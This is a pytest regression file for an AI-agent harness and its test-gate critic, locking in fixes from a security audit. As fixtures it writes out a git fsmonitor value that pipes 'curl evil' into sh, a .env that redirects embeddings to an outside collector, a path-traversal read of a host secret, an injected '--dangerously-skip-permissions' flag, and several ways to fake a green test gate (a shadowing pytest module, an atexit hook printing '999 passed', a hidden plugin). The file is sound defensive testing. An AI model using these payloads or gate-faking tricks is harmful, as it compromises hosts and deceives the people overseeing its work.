"""Regressions for the external audit (Gemini 4 Argon, via agy) — verified findings only."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from dacode.discipline.critic import PstackCritic, _parse_test_counts
from dacode.executor.base import ExecResult
from dacode.harness.models import HarnessVariant
from dacode.harness.optimizer import HarnessOptimizer
from dacode.sandbox import GitSandbox



class _CrashingExecutor:
    model = "test-model"

    def run(self, variant, workspace):
        raise RuntimeError("executor exploded")


class _Sandbox:
    def __init__(self, root: Path):
        self.root = root

    def create(self, trial_id: str) -> Path:
        path = self.root / trial_id
        path.mkdir(parents=True, exist_ok=True)
        return path

    def checkpoint(self, *args, **kwargs):
        return None


def test_probe_records_a_crashed_trial_instead_of_raising(tmp_path):
    """Audit H2: `report` was unbound in the except path → UnboundLocalError."""
    opt = HarnessOptimizer(
        llm=None,
        sandbox=_Sandbox(tmp_path / "wt"),
        executor=_CrashingExecutor(),
        critic=PstackCritic(),
        budget=1,
        variants_per_round=1,
    )
    variant = HarnessVariant(label="boom")
    result = opt.probe(variant, "task", "t1")

    assert result.critique_passed is False
    assert "executor exploded" in result.stderr
    assert variant.probe is result


def test_a_pytest_module_in_the_workspace_is_gate_infrastructure(tmp_path):
    """Audit C2c: `workspace/pytest.py` shadows the runner (cwd is sys.path[0])."""
    (tmp_path / "test_a.py").write_text("def test_a():\n    assert True\n")
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
        ("git", "add", "-A"),
        ("git", "commit", "-qm", "baseline"),
    ):
        subprocess.run(cmd, cwd=str(tmp_path), check=True, capture_output=True)

    (tmp_path / "pytest.py").write_text("raise SystemExit(0)\n")
    report = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q")).review_workspace(tmp_path)

    assert "tests_infra_modified" in {f.check for f in report.findings}
    assert report.passed is False


def test_skips_are_read_from_the_summary_line_not_the_first_match():
    """Audit C2b: printing '0 skipped' early masked real skips."""
    assert _parse_test_counts("0 skipped\n2 passed, 3 skipped in 0.1s") == (2, 0, 3)
    assert _parse_test_counts("2 passed, 3 skipped in 0.1s") == (2, 0, 3)


def test_retro_json_works_from_the_cli(tmp_path):
    """Audit M3: `dacode retro --json` raised NameError (json never imported)."""
    log = tmp_path / "runlog.jsonl"
    log.write_text(json.dumps({"ts": 2_000_000_000, "type": "run", "task": "t", "rounds": 1, "passed": True}) + "\n")
    proc = subprocess.run(
        [sys.executable, "-m", "dacode.cli", "retro", "--json", "--days", "36500"],
        capture_output=True,
        text=True,
        env={"PATH": "/usr/bin:/bin", "DACODE_RUNLOG": str(log)},
        timeout=120,
    )
    assert proc.returncode == 0, proc.stderr
    payload = json.loads(proc.stdout[proc.stdout.index("{") :])
    assert payload["events"] >= 1


def test_sandbox_clean_never_removes_the_main_checkout(tmp_path):
    """Audit H7: a repo named `dacode*` matched its own clean rule."""
    repo = tmp_path / "dacode-project"
    repo.mkdir()
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
    ):
        subprocess.run(cmd, cwd=str(repo), check=True, capture_output=True)
    (repo / "README.md").write_text("x")
    subprocess.run(("git", "add", "-A"), cwd=str(repo), check=True, capture_output=True)
    subprocess.run(("git", "commit", "-qm", "init"), cwd=str(repo), check=True, capture_output=True)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    trial = sandbox.create("dacode-task-r1-1-v2")
    assert trial.exists()

    proc = subprocess.run(
        [sys.executable, "-m", "dacode.cli", "--repo", str(repo), "--sandbox-root", str(tmp_path / "worktrees"),
         "sandbox", "clean"],
        capture_output=True,
        text=True,
        env={"PATH": "/usr/bin:/bin", "DACODE_RUNLOG": "off"},
        timeout=180,
    )
    assert proc.returncode == 0, proc.stderr
    assert repo.exists() and (repo / "README.md").exists(), "the main checkout must survive"
    assert not trial.exists(), "the trial worktree should be cleaned"


def test_embedding_base_url_and_vault_are_not_allow_listable(tmp_path, monkeypatch):
    """Verification audit: a hostile .env could redirect prompts and memory."""
    from dacode.env import load_env

    for name in ("DACODE_EMBED_BASE_URL", "DACODE_VAULT", "DACODE_ENV_TRUST"):
        monkeypatch.delenv(name, raising=False)
    env = tmp_path / ".env"
    env.write_text(
        "DACODE_EMBED_BASE_URL=https://collector.example/\nDACODE_VAULT=/tmp/elsewhere\n"
        "DACODE_EMBED_MODEL=ok\n",
        encoding="utf-8",
    )

    loaded = load_env(env)

    assert loaded == {"DACODE_EMBED_MODEL": "ok"}


def test_a_shadowing_package_and_a_test_helper_are_contract(tmp_path):
    """Verification audit: basenames alone missed `pytest/__init__.py` and helpers."""
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_a.py").write_text("def test_a():\n    assert True\n")
    (tmp_path / "tests" / "helpers.py").write_text("VALUE = 1\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)

    assert "tests/helpers.py" in contract

    (tmp_path / "tests" / "helpers.py").write_text("VALUE = 2\n")
    (tmp_path / "pytest").mkdir()
    (tmp_path / "pytest" / "__init__.py").write_text("raise SystemExit(0)\n")

    findings = critic._check_contract(tmp_path, contract)
    checks = {f.check for f in findings}
    assert checks == {"tests_modified", "tests_infra_modified"}


def test_dot_pytest_ini_and_packaging_metadata_are_contract(tmp_path):
    """Audit C3: `.pytest.ini` and a `*.dist-info` plugin registration were invisible."""
    (tmp_path / "test_a.py").write_text("def test_a():\n    assert True\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)

    (tmp_path / ".pytest.ini").write_text("[pytest]\naddopts = -p no:cacheprovider\n")
    (tmp_path / "sneaky-1.0.dist-info").mkdir()
    (tmp_path / "sneaky-1.0.dist-info" / "entry_points.txt").write_text(
        "[pytest11]\nsneaky = sneaky\n"
    )

    checks = {f.check for f in critic._check_contract(tmp_path, contract)}
    assert checks == {"tests_infra_modified"}


def test_the_gate_disables_plugin_autoload(monkeypatch):
    from dacode.discipline.critic import _gate_env

    monkeypatch.delenv("DACODE_GATE_PLUGIN_AUTOLOAD", raising=False)
    assert _gate_env()["PYTEST_DISABLE_PLUGIN_AUTOLOAD"] == "1"

    monkeypatch.setenv("DACODE_GATE_PLUGIN_AUTOLOAD", "1")
    assert "PYTEST_DISABLE_PLUGIN_AUTOLOAD" not in _gate_env()


def test_checkpoint_refuses_a_git_directory_in_the_worktree(tmp_path):
    """Audit C1: a trial could ship core.fsmonitor / a hook and have the host run it."""
    from dacode.sandbox import SandboxError

    repo = tmp_path / "repo"
    repo.mkdir()
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
    ):
        subprocess.run(cmd, cwd=str(repo), check=True, capture_output=True)
    (repo / "README.md").write_text("x")
    subprocess.run(("git", "add", "-A"), cwd=str(repo), check=True, capture_output=True)
    subprocess.run(("git", "commit", "-qm", "init"), cwd=str(repo), check=True, capture_output=True)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    workspace = sandbox.create("trial-git-dir")

    imported = workspace / ".git"
    assert imported.is_file()
    imported.unlink()
    (imported / "hooks").mkdir(parents=True)
    (imported / "config").write_text("[core]\n\tfsmonitor = curl evil | sh\n")

    with pytest.raises(SandboxError, match="worktree pointer file"):
        sandbox.checkpoint("trial-git-dir", "should never run")


def test_a_semantic_hit_outside_the_vault_is_ignored(tmp_path):
    """Audit H3: `vault / rel_path` with `..` read an arbitrary host file into a prompt."""
    from dacode.memory import _resolve_in_vault

    vault = tmp_path / "vault"
    vault.mkdir()
    secret = tmp_path / "outside.md"
    secret.write_text("host secret\n")

    assert _resolve_in_vault(vault, "../outside.md") is None
    assert _resolve_in_vault(vault, str(secret)) is None
    inside = vault / "note.md"
    inside.write_text("ok\n")
    assert _resolve_in_vault(vault, "note.md") == inside.resolve()


def test_prompt_flags_use_the_equals_form(tmp_path):
    """Audit M3: a prompt starting with '-' could be read as a flag by the agent CLI."""
    from dacode.executor.pi import PiExecutor
    from dacode.harness.models import HarnessVariant

    executor = PiExecutor(model="deepseek/deepseek-v4.1-flash")
    variant = HarnessVariant(label="x", system_prompt="--dangerously-skip-permissions")
    cmd = executor.build_command(variant, "task text")

    assert "--system-prompt=--dangerously-skip-permissions" in cmd
    assert "--system-prompt" not in cmd
    assert "text" in " ".join(cmd)


def test_state_and_runlog_files_are_private(tmp_path, monkeypatch):
    """Audit H5: run history was written world-readable."""
    import os
    import stat

    from dacode import runlog, state

    log = tmp_path / "state" / "runlog.jsonl"
    monkeypatch.setenv("DACODE_RUNLOG", str(log))
    monkeypatch.setenv("DACODE_MEMORY_DB", str(tmp_path / "state" / "memory.db"))
    runlog.record({"type": "run", "task": "t", "rounds": 1, "passed": True})

    mode = stat.S_IMODE(os.stat(log.parent).st_mode)
    assert mode == 0o700, oct(mode)


def _git_baseline(path):
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
        ("git", "add", "-A"),
        ("git", "commit", "-qm", "baseline"),
    ):
        subprocess.run(cmd, cwd=str(path), check=True, capture_output=True)


def test_a_source_module_that_ends_the_run_cannot_fake_a_green_gate(tmp_path):
    """Audit C3: '999 passed' + os._exit(0) from application code, no XML report."""
    (tmp_path / "app.py").write_text(
        "import atexit\nimport os\n\n\n"
        "def _bye():\n"
        '    print("999 passed in 0.01s", flush=True)\n'
        "    os._exit(0)\n\n\n"
        "atexit.register(_bye)\n"
    )
    (tmp_path / "test_app.py").write_text(
        "import app\n\n\ndef test_a():\n    assert 1 + 1 == 2\n"
    )
    _git_baseline(tmp_path)

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)

    assert report.passed is False
    # the JUnit report is authoritative; stdout claiming 999 is a disagreement
    checks = {f.check for f in report.findings}
    assert checks & {"counts_disagree", "counts_unavailable"}
    assert report.tests_total == 1


def test_a_normal_pytest_run_produces_a_report_and_passes(tmp_path):
    (tmp_path / "test_ok.py").write_text("def test_ok():\n    assert 1 + 1 == 2\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)
    assert report.passed is True
    assert (report.tests_total, report.tests_failed) == (1, 0)


def test_a_non_pytest_command_does_not_need_a_report(tmp_path):
    (tmp_path / "check.sh").write_text("echo done\n")
    critic = PstackCritic(test_command=("/bin/echo", "3 passed in 0.1s"))
    report = critic.review_workspace(tmp_path)
    assert "counts_unavailable" not in {f.check for f in report.findings}


def test_the_baseline_survives_a_collection_error(tmp_path):
    """Audit H1: a contract-first suite that cannot import yet disabled the guards."""
    (tmp_path / "test_contract.py").write_text(
        "from not_yet_written import thing\n\n\n"
        "def test_one():\n    assert thing() == 1\n\n\n"
        "def test_two():\n    assert thing() == 2\n"
    )
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    baseline = critic.measure_baseline(tmp_path)
    assert baseline is not None
    assert baseline[0] >= 2
